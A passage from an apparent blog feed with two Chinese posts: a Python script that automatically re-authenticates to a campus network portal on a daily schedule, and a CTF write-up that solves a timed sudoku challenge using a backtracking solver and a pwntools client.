All content ----------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(requestObj.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*************** test log end ********************&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showLog</span>(<span class="params">requestObj</span>):</span><br><span class="line">    result = re.findall(<span class="string">r&quot;认证成功页&quot;</span>, requestObj.text)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(result) &gt; <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;*************** ok ********************&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ACLogin</span>(<span class="params">ip, <span class="built_in">id</span>, passwd, isp</span>):</span><br><span class="line">    url = <span class="string">&quot;http://172.16.2.100:801/eportal/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3759.4 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">f&quot;http://172.16.2.100/a70.htm?wlanuserip=<span class="subst">&#123;ip&#125;</span>&amp;wlanacip=null&amp;wlanacname=null&amp;vlanid=0&amp;ip=<span class="subst">&#123;ip&#125;</span>&amp;ssid=null&amp;areaID=null&amp;mac=00-00-00-00-00-00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>, <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;172.16.2.100:801&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://172.16.2.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;c&quot;</span>: <span class="string">&quot;ACSetting&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">&quot;Login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;http:&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;172.16.2.100&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iTermType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wlanuserip&quot;</span>: ip,</span><br><span class="line">        <span class="string">&quot;wlanacip&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wlanacname&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mac&quot;</span>: <span class="string">&quot;00-00-00-00-00-00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: ip,</span><br><span class="line">        <span class="string">&quot;enAdvert&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;queryACIP&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;loginMethod&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    postData = &#123;<span class="string">&quot;DDDDD&quot;</span>: <span class="string">f&quot;,0,<span class="subst">&#123;<span class="built_in">id</span>&#125;</span><span class="subst">&#123;isp&#125;</span>&quot;</span>, <span class="string">&quot;upass&quot;</span>: passwd, <span class="string">&quot;R1&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;R2&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;R3&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;R6&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;para&quot;</span>: <span class="string">&quot;00&quot;</span>,</span><br><span class="line">                <span class="string">&quot;0MKKey&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;buttonClicked&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;redirect_url&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;err_flag&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;user&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;Login&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    cookiesData = &#123;<span class="string">&quot;ISP_select&quot;</span>: isp, <span class="string">&quot;areaID&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;ip&quot;</span>: ip, <span class="string">&quot;md5_login2&quot;</span>: <span class="string">f&quot;%2C0%2C<span class="subst">&#123;<span class="built_in">id</span>&#125;</span><span class="subst">&#123;isp&#125;</span>%7C<span class="subst">&#123;passwd&#125;</span>&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;program&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;vlan&quot;</span>: <span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    acRequest = requests.post(</span><br><span class="line">        url, params=payload, data=postData, cookies=cookiesData, headers=headers)</span><br><span class="line">    showLog(acRequest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getIpandMac_win</span>():</span><br><span class="line">    ipmac = os.popen(<span class="string">&quot;ipconfig /all&quot;</span>).read()</span><br><span class="line">    ip = re.findall(<span class="string">r&quot;\d+.\d+.\d+.\d+&quot;</span>, ipmac)[<span class="number">0</span>]</span><br><span class="line">    mac = re.findall(<span class="string">r&quot;\w+-\w+-\w+-\w+-+\w+-\w+&quot;</span>, ipmac)[<span class="number">0</span>]</span><br><span class="line">    dmac = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> mac.split(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        dmac += a</span><br><span class="line">    <span class="keyword">return</span> (ip, dmac,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getIpandMac_linux</span>():</span><br><span class="line">    ipmac = os.popen(<span class="string">&quot;ifconfig -a&quot;</span>).read()</span><br><span class="line">    ip = re.findall(<span class="string">r&quot;\d+.\d+.\d+.\d+&quot;</span>, ipmac)[<span class="number">0</span>]</span><br><span class="line">    mac = re.findall(<span class="string">r&quot;\w+:\w+:\w+:\w+:+\w+:\w+&quot;</span>, ipmac)[<span class="number">0</span>]</span><br><span class="line">    dmac = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> mac.split(<span class="string">&quot;:&quot;</span>):</span><br><span class="line">        dmac += a</span><br><span class="line">    <span class="keyword">return</span> (ip, dmac,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ACLogout</span>(<span class="params"><span class="built_in">id</span>, passwd, isp, os</span>):</span><br><span class="line">    <span class="keyword">if</span> os == <span class="string">&quot;linux&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;os = <span class="subst">&#123;os&#125;</span>&#x27;</span>)</span><br><span class="line">        ip = getIpandMac_linux()[<span class="number">0</span>]</span><br><span class="line">        mac = getIpandMac_linux()[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;os = <span class="subst">&#123;os&#125;</span>&#x27;</span>)</span><br><span class="line">        ip = getIpandMac_win()[<span class="number">0</span>]</span><br><span class="line">        mac = getIpandMac_win()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://172.16.2.100:801/eportal/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3759.4 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">f&quot;http://172.16.2.100/a70.htm?wlanuserip=<span class="subst">&#123;ip&#125;</span>&amp;wlanacip=null&amp;wlanacname=null&amp;vlanid=0&amp;ip=<span class="subst">&#123;ip&#125;</span>&amp;ssid=null&amp;areaID=null&amp;mac=00-00-00-00-00-00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>, <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;172.16.2.100:801&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://172.16.2.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;c&quot;</span>: <span class="string">&quot;ACSetting&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">&quot;Logout&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;protocol&quot;: &quot;http:&quot;,</span></span><br><span class="line">        <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;172.16.2.100&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iTermType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wlanuserip&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wlanacip&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wlanacname&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mac&quot;</span>: mac,</span><br><span class="line">        <span class="string">&quot;queryACIP&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;port&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cookiesData = &#123;<span class="string">&quot;ISP_select&quot;</span>: isp, <span class="string">&quot;areaID&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;ip&quot;</span>: ip, <span class="string">&quot;md5_login2&quot;</span>: <span class="string">f&quot;%2C0%2C<span class="subst">&#123;<span class="built_in">id</span>&#125;</span><span class="subst">&#123;isp&#125;</span>%7C<span class="subst">&#123;passwd&#125;</span>&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;program&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;vlan&quot;</span>: <span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    acRequest = requests.post(</span><br><span class="line">        url, params=payload, cookies=cookiesData, headers=headers)</span><br><span class="line">    <span class="comment"># TestLog(acRequest)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># info = IdAndPasswd()</span></span><br><span class="line"><span class="comment"># ACLogout(info[0], info[1], info[2], info[3])</span></span><br><span class="line"><span class="comment"># ip = GetIp()</span></span><br><span class="line"><span class="comment"># ACLogin(ip, info[0], info[1], info[2])</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">定时</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">job</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]I&#x27;m logging in...now is ：&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())))</span><br><span class="line">    info = IdAndPasswd()</span><br><span class="line">    ACLogout(info[<span class="number">0</span>], info[<span class="number">1</span>], info[<span class="number">2</span>], info[<span class="number">3</span>])</span><br><span class="line">    ip = GetIp()</span><br><span class="line">    ACLogin(ip, info[<span class="number">0</span>], info[<span class="number">1</span>], info[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># schedule.run_all()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]正在执行定时项目......&#x27;</span>)</span><br><span class="line">    schedule.every().day.at(<span class="string">&quot;02:30&quot;</span>).do(job)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>账号密码放在<code>.logindata.data</code>中，第一次运行将会要求你配置账号密码和运营商，自行填写即可。</p><p>然后使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S ac</span><br></pre></td></tr></table></figure><p>创建一个名为<code>ac</code>的后台窗口，默认创建之后自动进入该会话，启动完脚本直接关闭即可。</p><p>需要再次进入则输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -r ac</span><br></pre></td></tr></table></figure><p>查看当前会话列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -ls</span><br></pre></td></tr></table></figure><p>这里脚本设置是每天凌晨02:30自动进行认证，到这里配置就完成了，如有错误欢迎大家在评论区指正。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Web </tag>
            
            <tag> bs4 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[2023安洵杯]misc-sudoku数独游戏</title>
      <link href="/2023/06/10/62ae16ba4e67-q1jun/"/>
      <url>/2023/06/10/62ae16ba4e67-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p>题目大意：规定时间内通过解决数个数独问题来获得flag。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230611010421239.png" alt="image-20230611010421239"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230611005056289.png" alt="image-20230611005056289"></p><p>一共需要120分。</p><h2 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h2><p>先分析交互命令行的输入输出：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230611005149286.png" alt="image-20230611005149286"></p><p>首先输入<code>1</code>开始游戏，题目给出三种难度，难度越高分值越大。</p><p>输入<strong>3&#x2F;4&#x2F;5</strong>选择游戏难度，然后题目给出数独题目内容，其中数字<code>0</code>表示需要填入的内容。</p><blockquote><p>数独游戏规则：</p><p>每一行、每一列、每一个粗线宫内的数字不重复，其中粗线宫的划分如下所示：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/2-450-jpg_6_0_______-552-0-450-552.jpg" alt="数独题目"></p></blockquote><p>将解出的答案以题目要求的格式输入即可，得到120分时可以获得flag（实际上是得到shell）。</p><p>首先上网搜一段解决数独的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_empty</span>(<span class="params">puzzle</span>):</span><br><span class="line">    <span class="comment"># finds the next row, col on the puzzle that&#x27;s not filled yet --&gt; rep with 0</span></span><br><span class="line">    <span class="comment"># return row, col tuple (or (None, None) if there is none)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># keep in mind that we are using 0-8 for our indices</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>): <span class="comment"># range(9) is 0, 1, 2, ... 8</span></span><br><span class="line">            <span class="keyword">if</span> puzzle[r][c] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> r, c</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>  <span class="comment"># if no spaces in the puzzle are empty (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">puzzle, guess, row, col</span>):</span><br><span class="line">    <span class="comment"># figures out whether the guess at the row/col of the puzzle is a valid guess</span></span><br><span class="line">    <span class="comment"># returns True or False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># for a guess to be valid, then we need to follow the sudoku rules</span></span><br><span class="line">    <span class="comment"># that number must not be repeated in the row, column, or 3x3 square that it appears in</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># let&#x27;s start with the row</span></span><br><span class="line">    row_vals = puzzle[row]</span><br><span class="line">    <span class="keyword">if</span> guess <span class="keyword">in</span> row_vals:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># if we&#x27;ve repeated, then our guess is not valid!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># now the column</span></span><br><span class="line">    <span class="comment"># col_vals = []</span></span><br><span class="line">    <span class="comment"># for i in range(9):</span></span><br><span class="line">    <span class="comment">#     col_vals.append(puzzle[i][col])</span></span><br><span class="line">    col_vals = [puzzle[i][col] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">    <span class="keyword">if</span> guess <span class="keyword">in</span> col_vals:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># and then the square</span></span><br><span class="line">    row_start = (row // <span class="number">3</span>) * <span class="number">3</span> <span class="comment"># 10 // 3 = 3, 5 // 3 = 1, 1 // 3 = 0</span></span><br><span class="line">    col_start = (col // <span class="number">3</span>) * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(row_start, row_start + <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col_start, col_start + <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> puzzle[r][c] == guess:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_sudoku</span>(<span class="params">puzzle</span>):</span><br><span class="line">    <span class="comment"># solve sudoku using backtracking!</span></span><br><span class="line">    <span class="comment"># our puzzle is a list of lists, where each inner list is a row in our sudoku puzzle</span></span><br><span class="line">    <span class="comment"># return whether a solution exists</span></span><br><span class="line">    <span class="comment"># mutates puzzle to be the solution (if solution exists)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 1: choose somewhere on the puzzle to make a guess</span></span><br><span class="line">    row, col = find_next_empty(puzzle)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step 1.1: if there&#x27;s nowhere left, then we&#x27;re done because we only allowed valid inputs</span></span><br><span class="line">    <span class="keyword">if</span> row <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># this is true if our find_next_empty function returns None, None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 2: if there is a place to put a number, then make a guess between 1 and 9</span></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>): <span class="comment"># range(1, 10) is 1, 2, 3, ... 9</span></span><br><span class="line">        <span class="comment"># step 3: check if this is a valid guess</span></span><br><span class="line">        <span class="keyword">if</span> is_valid(puzzle, guess, row, col):</span><br><span class="line">            <span class="comment"># step 3.1: if this is a valid guess, then place it at that spot on the puzzle</span></span><br><span class="line">            puzzle[row][col] = guess</span><br><span class="line">            <span class="comment"># step 4: then we recursively call our solver!</span></span><br><span class="line">            <span class="keyword">if</span> solve_sudoku(puzzle):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># step 5: it not valid or if nothing gets returned true, then we need to backtrack and try a new number</span></span><br><span class="line">        puzzle[row][col] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># step 6: if none of the numbers that we try work, then this puzzle is UNSOLVABLE!!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">example_board = [</span><br><span class="line">    [<span class="number">3</span>, <span class="number">9</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>,   <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">    [<span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">6</span>, <span class="number">8</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">    [<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>,   <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>,   <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>,   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,   <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(solve_sudoku(example_board))</span><br><span class="line">pprint(example_board)</span><br></pre></td></tr></table></figure><p>其次根据nc内容编写pwntools脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;47.108.165.60&quot;</span>,<span class="number">41572</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please input:&#x27;</span>)</span><br><span class="line">    r.send(<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please select the level:&#x27;</span>)</span><br><span class="line">    r.send(<span class="string">b&#x27;5\n&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;---------------------\n&#x27;</span>)</span><br><span class="line">    board = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        line1 = <span class="built_in">str</span>(r.recvline()).replace(<span class="string">&quot;b\&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\\n\&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;line1= <span class="subst">&#123;line1&#125;</span>&quot;</span>)</span><br><span class="line">        list1 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> line1:</span><br><span class="line">            list1.append(<span class="built_in">int</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(list1)</span><br><span class="line">        board.append(list1)</span><br><span class="line">    pprint(board)</span><br><span class="line">    <span class="built_in">print</span>(solve_sudoku(board))</span><br><span class="line">    pprint(board)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;now give me you solve:&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> board:</span><br><span class="line">        line1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> b:</span><br><span class="line">            line1 += <span class="built_in">str</span>(l)</span><br><span class="line">        r.sendline(line1.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;现在是第<span class="subst">&#123;k&#125;</span>轮&quot;</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">6</span>:</span><br><span class="line">        r.interactive()</span><br></pre></td></tr></table></figure><p>将两段代码合并起来，实测下来只需要解决7轮hard难度的数独就可以拿到flag了</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230611010153434.png" alt="image-20230611010153434"></p><p>本文章仅做记录和参考使用，如有错误希望师傅们在评论区指出🙏</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
